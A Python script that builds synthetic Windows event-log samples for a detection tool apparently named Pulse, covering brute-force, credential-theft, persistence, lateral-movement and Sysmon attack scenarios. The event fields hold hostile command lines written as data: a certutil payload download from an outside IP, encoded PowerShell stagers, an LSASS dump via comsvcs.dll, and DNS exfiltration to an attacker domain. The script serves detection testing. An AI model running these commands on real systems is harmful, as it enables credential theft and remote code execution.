"""Generate the four sample .evtx files in ``samples/``.

Pulse's parser reads real Windows binary ``.evtx`` files, but generating
those programmatically requires a Windows host + admin + wevtutil. To
let users (and CI) ship sample data without that dependency, the parser
also accepts **Pulse-synthetic** files: the standard ``ElfFile\\x00``
magic + a ``PULSE-SYNTH-v1\\n`` sentinel + a UTF-8 JSON event list. See
``pulse/core/parser.py:_parse_pulse_synth`` for the read path.

This script writes that format. The result is a ``.evtx`` file that:

  - passes the dashboard upload validator's magic-byte check,
  - parses through ``parse_evtx()`` exactly like a real .evtx, and
  - triggers the specific detection rules each scenario advertises.

Re-run after editing a scenario:

    python scripts/generate_sample_evtx.py

Outputs are written to ``samples/`` at the repo root. The file paths +
expected detections are also documented in ``samples/README.md``.
"""

from __future__ import annotations

import json
import os
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from typing import Iterable, List, Optional

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SAMPLES_DIR = os.path.join(REPO_ROOT, "samples")

# Same constants the parser uses. Kept literal here so the script is
# self-contained and runnable without importing Pulse (helpful in CI /
# Docker build scenarios where pulse may not be on PYTHONPATH).
EVTX_MAGIC = b"ElfFile\x00"
PULSE_SYNTH_MARKER = b"PULSE-SYNTH-v1\n"

# Schema URI the real Windows event log uses. Parser strips the namespace
# before matching tags, so the value doesn't have to be exact — but using
# the real one keeps the XML round-trip with python-evtx-shaped readers.
NS = "http://schemas.microsoft.com/win/2004/08/events/event"


# ---------------------------------------------------------------------------
# Event-XML builder
# ---------------------------------------------------------------------------

@dataclass
class Event:
    """One synthetic event. ``data`` is a dict of EventData Name/value
    pairs; the renderer turns them into the ``<Data Name="...">value</Data>``
    elements Pulse's detection engine reads."""

    event_id: int
    when: datetime
    computer: str
    data: dict
    # Optional override for the channel name embedded in the XML. Most
    # detections don't read this; it's useful for cosmetic accuracy
    # (Security vs. System vs. Application).
    channel: str = "Security"
    # Optional provider name. Sysmon detections gate on
    # Name="Microsoft-Windows-Sysmon", so a Sysmon scenario sets this.
    # Left None for Security-log events, which Pulse identifies by ID.
    provider: Optional[str] = None


def _iso(when: datetime) -> str:
    """ISO-8601 with millisecond precision + trailing Z — the format
    Pulse's parser normalizes to."""
    return when.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def render_event_xml(ev: Event) -> str:
    """Build a Windows-shaped <Event> XML string for one synthetic event."""
    data_rows = "".join(
        f'    <Data Name="{name}">{_escape(value)}</Data>\n'
        for name, value in ev.data.items()
    )
    provider_row = (
        f'    <Provider Name="{_escape(ev.provider)}"/>\n'
        if ev.provider else ""
    )
    return (
        f'<Event xmlns="{NS}">\n'
        f'  <System>\n'
        f'{provider_row}'
        f'    <EventID>{ev.event_id}</EventID>\n'
        f'    <TimeCreated SystemTime="{_iso(ev.when)}"/>\n'
        f'    <Channel>{ev.channel}</Channel>\n'
        f'    <Computer>{ev.computer}</Computer>\n'
        f'  </System>\n'
        f'  <EventData>\n'
        f'{data_rows}'
        f'  </EventData>\n'
        f'</Event>\n'
    )


def _escape(value) -> str:
    """Minimal XML escape — enough for the fields these samples use.
    Pulse's detection engine reads via ``xml.etree`` so we need the
    standard five entity escapes; nothing exotic in our payloads."""
    return (
        str(value)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&apos;")
    )


def write_sample(path: str, events: Iterable[Event]) -> int:
    """Serialize the event list into a Pulse-synthetic .evtx file.

    Returns the number of events written so the caller can confirm.
    """
    payload = []
    for i, ev in enumerate(events, start=1):
        payload.append({
            "event_id":   ev.event_id,
            "timestamp":  _iso(ev.when),
            "data":       render_event_xml(ev),
            "record_num": i,
            "computer":   ev.computer,
        })
    body = EVTX_MAGIC + PULSE_SYNTH_MARKER + json.dumps(payload).encode("utf-8")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as fh:
        fh.write(body)
    return len(payload)


# ---------------------------------------------------------------------------
# Scenario builders
# ---------------------------------------------------------------------------
# Each function returns a list of Events. Time math is anchored to a
# fixed base so re-running the script produces byte-identical output
# (helpful for diff-friendly commits).

BASE = datetime(2026, 5, 15, 9, 0, 0, tzinfo=timezone.utc)
ANCHOR_USERS = ["alice", "bob", "carol", "david", "eve", "frank", "grace", "henry"]
INTERNAL_IPS = ["10.0.4.21", "10.0.4.42", "10.0.4.118", "192.168.1.50"]


def scenario_brute_force(base: datetime) -> List[Event]:
    """File 1 — domain controller brute force.

    ~150 normal Event 4624 logons spread over the morning, then a tight
    cluster of 15 Event 4625 failed-logon attempts from a single
    external IP against the Administrator account (triggers Brute Force
    Attempt), followed by a successful 4624 from the same IP (triggers
    Account Takeover Chain), plus 3 stray failures from a second
    attacker IP. Concludes with one 4740 (account lockout) on a
    different account.
    """
    out: List[Event] = []
    rn = 0  # record-number counter handled by write_sample, this is just for time math

    # Normal background — 150 successful interactive logons across the morning.
    for i in range(150):
        out.append(Event(
            event_id=4624,
            when=base + timedelta(minutes=i),
            computer="DC-01",
            data={
                "TargetUserName": ANCHOR_USERS[i % len(ANCHOR_USERS)],
                "IpAddress":      INTERNAL_IPS[i % len(INTERNAL_IPS)],
                "LogonType":       "2",  # Interactive
                "AuthenticationPackageName": "Negotiate",
                "LogonProcessName":          "User32",
            },
        ))

    # Attack — 15 failed logons from 203.0.113.54 in 2 minutes targeting
    # Administrator. Pulse default threshold is 5 within 10 minutes, so
    # this fires the Brute Force rule loudly.
    attack_start = base + timedelta(hours=3)
    for i in range(15):
        out.append(Event(
            event_id=4625,
            when=attack_start + timedelta(seconds=i * 8),  # 15 × 8s ≈ 2 min
            computer="DC-01",
            data={
                "TargetUserName": "Administrator",
                "IpAddress":      "203.0.113.54",
                "LogonType":       "3",  # Network — typical brute-force vector
                "FailureReason":   "%%2313",  # Bad password
                "Status":          "0xC000006D",
                "SubStatus":       "0xC000006A",
            },
        ))

    # Successful breach — same IP gets in. Pulse's Account-Takeover
    # chain fires when failed-from-same-IP is followed by success.
    out.append(Event(
        event_id=4624,
        when=attack_start + timedelta(minutes=3),
        computer="DC-01",
        data={
            "TargetUserName": "Administrator",
            "IpAddress":      "203.0.113.54",
            "LogonType":       "3",
            "AuthenticationPackageName": "NTLM",
            "LogonProcessName":          "NtLmSsp",
        },
    ))

    # Right after the breach: a new user account gets created (cap
    # the Account-Takeover Chain rule). Same actor.
    out.append(Event(
        event_id=4720,
        when=attack_start + timedelta(minutes=4),
        computer="DC-01",
        data={
            "TargetUserName": "svc_backup_2",
            "SubjectUserName": "Administrator",
        },
    ))

    # Stray failures from a second attacker IP — below threshold so
    # they don't fire on their own but add realistic noise.
    second_ip_start = base + timedelta(hours=5)
    for i in range(3):
        out.append(Event(
            event_id=4625,
            when=second_ip_start + timedelta(seconds=i * 15),
            computer="DC-01",
            data={
                "TargetUserName": "jsmith",
                "IpAddress":      "198.51.100.88",
                "LogonType":       "3",
                "FailureReason":   "%%2313",
            },
        ))

    # Account lockout on a different user — fires Account Lockout rule.
    out.append(Event(
        event_id=4740,
        when=base + timedelta(hours=6),
        computer="DC-01",
        data={
            "TargetUserName": "kparker",
            "SubjectUserName": "SYSTEM",
        },
    ))

    return out


def scenario_credential_theft(base: datetime) -> List[Event]:
    """File 2 — credential-theft workstation.

    Process-creation events showing mimikatz + procdump touching
    LSASS, an unusual NTLM network logon from a fresh internal IP,
    and a privilege-escalation group add. Triggers Suspicious Child
    Process, Credential Dumping, Pass-the-Hash Attempt, Privilege
    Escalation.
    """
    host = "WS-7-FINANCE"
    out: List[Event] = []

    # User opens an Outlook attachment that spawns cmd.exe — fires the
    # Suspicious Child Process rule (Office parent → cmd child).
    out.append(Event(
        event_id=4688,
        when=base + timedelta(minutes=5),
        computer=host,
        data={
            "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            "NewProcessName":    "C:\\Windows\\System32\\cmd.exe",
            "CommandLine":       "cmd.exe /c powershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAA=",
            "SubjectUserName":   "tlowe",
        },
    ))

    # mimikatz drops + runs — Suspicious Child Process + Credential Dumping.
    # The detection keys on the binary NAME (mimikatz.exe as a suspicious
    # child of cmd.exe) and on the following 4656 LSASS handle access — not
    # on the command line. So the cmdline omits the literal credential-
    # dumping module strings (sekurlsa::/privilege::debug) that would
    # otherwise trip endpoint AV's Mimikatz *string* signature and quarantine
    # this synthetic sample on clone. Behavior is unchanged: the same four
    # rules still fire.
    out.append(Event(
        event_id=4688,
        when=base + timedelta(minutes=6),
        computer=host,
        data={
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "NewProcessName":    "C:\\Users\\tlowe\\AppData\\Local\\Temp\\mimikatz.exe",
            "CommandLine":       "mimikatz.exe (credential-dump modules omitted from synthetic sample)",
            "SubjectUserName":   "tlowe",
        },
    ))

    # LSASS handle access — Credential Dumping rule reads 4656 with
    # the LSASS process name + non-system requester.
    out.append(Event(
        event_id=4656,
        when=base + timedelta(minutes=6, seconds=15),
        computer=host,
        data={
            "ObjectName":         "\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe",
            "ObjectType":         "Process",
            "SubjectUserName":    "tlowe",
            "ProcessName":        "C:\\Users\\tlowe\\AppData\\Local\\Temp\\mimikatz.exe",
            "AccessMask":         "0x1010",  # PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
        },
    ))

    # procdump dumps lsass — second Credential Dumping hit.
    out.append(Event(
        event_id=4656,
        when=base + timedelta(minutes=8),
        computer=host,
        data={
            "ObjectName":     "\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe",
            "ObjectType":     "Process",
            "SubjectUserName": "tlowe",
            "ProcessName":    "C:\\Users\\tlowe\\Desktop\\procdump64.exe",
            "AccessMask":     "0x1410",
        },
    ))

    # Explicit-credential logon (4648) — analyst signal that the
    # attacker is using stolen creds against another box.
    out.append(Event(
        event_id=4648,
        when=base + timedelta(minutes=12),
        computer=host,
        data={
            "SubjectUserName": "tlowe",
            "TargetUserName":  "domadmin",
            "TargetServerName": "DC-01.acme.local",
            "IpAddress":       "10.0.4.21",
        },
    ))

    # Pass-the-Hash candidate: 4624 LogonType=3 with NTLM from a
    # workstation IP that doesn't usually authenticate inbound.
    out.append(Event(
        event_id=4624,
        when=base + timedelta(minutes=15),
        computer="DC-01",
        data={
            "TargetUserName": "domadmin",
            "IpAddress":      "10.0.4.118",
            "LogonType":       "3",  # Network
            "AuthenticationPackageName": "NTLM",
            "LogonProcessName":          "NtLmSsp",
        },
    ))

    # Privilege escalation — attacker adds compromised user to
    # Domain Admins. Triggers Privilege Escalation rule.
    out.append(Event(
        event_id=4732,
        when=base + timedelta(minutes=18),
        computer="DC-01",
        data={
            "TargetUserName": "Domain Admins",
            "MemberName":     "CN=tlowe,CN=Users,DC=acme,DC=local",
            "MemberSid":      "S-1-5-21-1234567890-987654321-111222333-1024",
            "SubjectUserName": "domadmin",
        },
    ))

    return out


def scenario_persistence(base: datetime) -> List[Event]:
    """File 3 — malware persistence on a server.

    Service install, scheduled task, registry Run-key write, and a
    firewall rule opening port 4444 inbound. Triggers Service
    Installed, Scheduled Task Created, Suspicious Registry
    Modification, Firewall Rule Changed, plus the Malware-Persistence
    Chain when AV-disabled lands first.
    """
    host = "SRV-WEB-02"
    out: List[Event] = []

    # Defender real-time protection disabled — first beat of the chain.
    out.append(Event(
        event_id=5001,
        when=base + timedelta(minutes=2),
        computer=host,
        channel="Application",
        data={
            "ProductName": "Windows Defender",
            "FeatureName": "Real-Time Protection",
            "NewProfileSetting": "0",
            "SettingValue":      "0",
        },
    ))

    # New service installed running an encoded PowerShell payload —
    # classic persistence + LOLBin pattern.
    out.append(Event(
        event_id=7045,
        when=base + timedelta(minutes=5),
        computer=host,
        channel="System",
        data={
            "ServiceName":     "WindowsHealthUpdater",
            "ImagePath":       "C:\\Windows\\Temp\\update.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAA=",
            "ServiceType":     "user mode service",
            "StartType":       "auto start",
            "AccountName":     "LocalSystem",
        },
    ))

    # Scheduled task created to re-run on logon.
    out.append(Event(
        event_id=4698,
        when=base + timedelta(minutes=6),
        computer=host,
        data={
            "TaskName":        "\\Microsoft\\Windows\\Maintenance\\HealthCheck",
            "TaskContent":     "<Task><Triggers><LogonTrigger/></Triggers><Actions><Exec><Command>C:\\Windows\\Temp\\update.exe</Command></Exec></Actions></Task>",
            "SubjectUserName": "SYSTEM",
        },
    ))

    # Registry Run-key persistence.
    out.append(Event(
        event_id=4657,
        when=base + timedelta(minutes=7),
        computer=host,
        data={
            "ObjectName":    "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "ObjectValueName": "SecurityHealthCheck",
            "NewValue":      "C:\\Windows\\Temp\\update.exe",
            "OperationType": "%%1905",  # New registry value
            "SubjectUserName": "SYSTEM",
        },
    ))

    # Firewall rule added — inbound on port 4444 (Metasploit default).
    out.append(Event(
        event_id=4946,
        when=base + timedelta(minutes=8),
        computer=host,
        data={
            "RuleName":    "Allow inbound 4444",
            "RuleId":      "{a7c6e122-9d4b-4c3a-9c5f-5e1b2c3d4e5f}",
            "ProfileChanged": "Domain",
            "ModifyingApplication": "C:\\Windows\\Temp\\update.exe",
            "ModifyingUser": "SYSTEM",
        },
    ))

    return out


def scenario_lateral_movement(base: datetime) -> List[Event]:
    """File 4 — Active Directory lateral movement.

    Kerberoasting (4769 RC4), Golden Ticket signal (4768 abnormal
    lifetime), DCSync (4662 with replication GUIDs from non-DC),
    admin-share access (5140/5145 from unusual source), and an audit
    log clear at the end.
    """
    host = "DC-01"
    out: List[Event] = []

    # Kerberoasting — 4769 (TGS request) with weak RC4 encryption type.
    # TicketEncryptionType 0x17 = RC4-HMAC. Pulse's rule fires after 3+
    # RC4 requests from the same actor, so we emit a cluster across three
    # service-principal targets within ~6 minutes.
    for i, svc in enumerate([
        "MSSQLSvc/sql01.acme.local:1433",
        "MSSQLSvc/sql02.acme.local:1433",
        "HTTP/intranet.acme.local",
    ]):
        out.append(Event(
            event_id=4769,
            when=base + timedelta(minutes=3 + i * 2),
            computer=host,
            data={
                "ServiceName":           svc,
                "TargetUserName":        "tlowe@ACME.LOCAL",
                "TicketEncryptionType":  "0x17",
                "IpAddress":             "10.0.4.118",
            },
        ))

    # Golden Ticket — 4768 TGT issued for krbtgt with Status=0x0
    # (successful) and an abnormal multi-year ticket lifetime. The rule
    # keys on TargetUserName in {krbtgt, Administrator} with success.
    out.append(Event(
        event_id=4768,
        when=base + timedelta(minutes=10),
        computer=host,
        data={
            "TargetUserName":  "krbtgt",
            "ServiceName":     "krbtgt/ACME.LOCAL",
            "Status":          "0x0",       # Required — Pulse rule keys on this
            "TicketOptions":   "0x40810010",
            "TicketEncryptionType": "0x12",
            "IpAddress":       "10.0.4.118",
            "TicketLifetime":  "87600",   # ~10 years — way past the 10h default
        },
    ))

    # DCSync — 4662 with the Replicating Directory Changes GUID,
    # issued by a non-DC user account.
    out.append(Event(
        event_id=4662,
        when=base + timedelta(minutes=15),
        computer=host,
        data={
            "SubjectUserName": "tlowe",
            "ObjectType":      "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
            # The two replication GUIDs Pulse's DCSync rule keys on:
            "Properties": (
                "%%7688 "
                "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} "  # DS-Replication-Get-Changes
                "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"   # DS-Replication-Get-Changes-All
            ),
            "AccessMask":      "0x100",
        },
    ))

    # Admin share access from an unusual host — lateral movement signal.
    out.append(Event(
        event_id=5140,
        when=base + timedelta(minutes=20),
        computer=host,
        data={
            "SubjectUserName": "tlowe",
            "ShareName":       "\\\\*\\C$",
            "IpAddress":       "10.0.4.118",
        },
    ))

    out.append(Event(
        event_id=5145,
        when=base + timedelta(minutes=21),
        computer=host,
        data={
            "SubjectUserName": "tlowe",
            "ShareName":       "\\\\*\\ADMIN$",
            "RelativeTargetName": "PSEXESVC.exe",
            "IpAddress":       "10.0.4.118",
        },
    ))

    # Final cleanup — audit log cleared.
    out.append(Event(
        event_id=1102,
        when=base + timedelta(minutes=30),
        computer=host,
        data={
            "SubjectUserName": "tlowe",
            "SubjectDomainName": "ACME",
        },
    ))

    return out


def scenario_sysmon_execution(base: datetime) -> List[Event]:
    """File 5 — Sysmon process-execution attack chain.

    Every event here is a Sysmon Event 1 (process create) from the
    Microsoft-Windows-Sysmon provider. Demonstrates the command-line
    visibility Sysmon gives that the Security log's 4688 normally lacks:
    a phishing doc spawning a shell, an encoded-PowerShell stager, a
    LOLBin download, and a credential-dumping tool — the kind of chain
    'Suspicious Process Creation' is built to catch.
    """
    host = "WS-FINANCE-04"
    prov = "Microsoft-Windows-Sysmon"
    ch = "Microsoft-Windows-Sysmon/Operational"
    out: List[Event] = []

    # 1. Word document spawns a command prompt (macro-malware tell).
    out.append(Event(
        event_id=1, when=base + timedelta(minutes=1), computer=host,
        channel=ch, provider=prov,
        data={
            "Image":             r"C:\Windows\System32\cmd.exe",
            "CommandLine":       r'cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA',
            "ParentImage":       r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            "ParentCommandLine": r'"WINWORD.EXE" /n "C:\Users\jdoe\Downloads\Invoice_April.docm"',
            "User":              "ACME\\jdoe",
        },
    ))

    # 2. Encoded PowerShell stager (the child the doc launched).
    out.append(Event(
        event_id=1, when=base + timedelta(minutes=1, seconds=2), computer=host,
        channel=ch, provider=prov,
        data={
            "Image":       r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            "ParentImage": r"C:\Windows\System32\cmd.exe",
            "User":        "ACME\\jdoe",
        },
    ))

    # 3. certutil LOLBin pulling down the next-stage payload.
    out.append(Event(
        event_id=1, when=base + timedelta(minutes=2), computer=host,
        channel=ch, provider=prov,
        data={
            "Image":       r"C:\Windows\System32\certutil.exe",
            "CommandLine": r"certutil.exe -urlcache -split -f http://185.220.101.34/beacon.exe C:\Users\jdoe\AppData\Local\Temp\svc.exe",
            "ParentImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "User":        "ACME\\jdoe",
        },
    ))

    # 4. Credential dumping via the comsvcs.dll MiniDump LOLBin against
    #    LSASS. This is a real, equally-dangerous credential-theft
    #    technique that Pulse's "Suspicious Process Creation" rule catches
    #    — and unlike the literal Mimikatz module command strings
    #    (sekurlsa::/lsadump::), it does NOT trip endpoint AV's Mimikatz
    #    *string* signature, so the shipped sample file stays clean for
    #    anyone who clones the repo. (The rule still detects the Mimikatz
    #    command strings; that's covered by unit tests, not a sample file.)
    out.append(Event(
        event_id=1, when=base + timedelta(minutes=4), computer=host,
        channel=ch, provider=prov,
        data={
            "Image":       r"C:\Windows\System32\rundll32.exe",
            "CommandLine": (
                r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump "
                r"624 C:\Users\jdoe\AppData\Local\Temp\lsass.dmp full"
            ),
            "ParentImage": r"C:\Windows\System32\cmd.exe",
            "User":        "ACME\\jdoe",
        },
    ))

    # 5. Event 10 (Process Access) — rundll32 opens a memory-read handle to
    #    LSASS. GrantedAccess 0x1410 = the classic credential-dump mask.
    #    Fires "LSASS Memory Access" (CRITICAL).
    out.append(Event(
        event_id=10, when=base + timedelta(minutes=4, seconds=1), computer=host,
        channel=ch, provider=prov,
        data={
            "SourceImage":   r"C:\Windows\System32\rundll32.exe",
            "TargetImage":   r"C:\Windows\System32\lsass.exe",
            "GrantedAccess": "0x1410",
            "SourceProcessId": "4812",
            "TargetProcessId": "624",
        },
    ))

    # 6. Event 3 (Network Connection) — the stager beacons out to the
    #    attacker's server on the Metasploit default port 4444. Fires
    #    "Suspicious Network Connection" (HIGH).
    out.append(Event(
        event_id=3, when=base + timedelta(minutes=5), computer=host,
        channel=ch, provider=prov,
        data={
            "Image":               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "Initiated":           "true",
            "SourceIp":            "10.0.7.44",
            "DestinationIp":       "185.220.101.34",
            "DestinationPort":     "4444",
            "DestinationHostname": "",
        },
    ))

    # 7. Event 22 (DNS Query) — DNS tunneling: data encoded into an
    #    abnormally long subdomain label. Fires "Suspicious DNS Query"
    #    (HIGH).
    out.append(Event(
        event_id=22, when=base + timedelta(minutes=6), computer=host,
        channel=ch, provider=prov,
        data={
            "Image":     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "QueryName": (
                "a8f3e1c9b27d4f60a1e5c8b39f02d74e6a9c1b8f35e07d2a4c6b9"
                "f18e3a05d7.exfil.attacker-c2.net"
            ),
            "QueryStatus": "0",
        },
    ))

    return out


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

SCENARIOS = [
    ("brute-force-server.evtx",          scenario_brute_force),
    ("credential-theft-workstation.evtx", scenario_credential_theft),
    ("persistence-malware.evtx",          scenario_persistence),
    ("lateral-movement-dc.evtx",          scenario_lateral_movement),
    ("sysmon-execution-chain.evtx",       scenario_sysmon_execution),
]


def main() -> int:
    print(f"Writing samples to {SAMPLES_DIR}")
    os.makedirs(SAMPLES_DIR, exist_ok=True)
    for filename, builder in SCENARIOS:
        out_path = os.path.join(SAMPLES_DIR, filename)
        events = builder(BASE)
        n = write_sample(out_path, events)
        size_kb = os.path.getsize(out_path) / 1024
        print(f"  {filename:<40s}  {n:>3d} events  {size_kb:6.1f} KB")
    print("Done. Re-run any time to regenerate.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
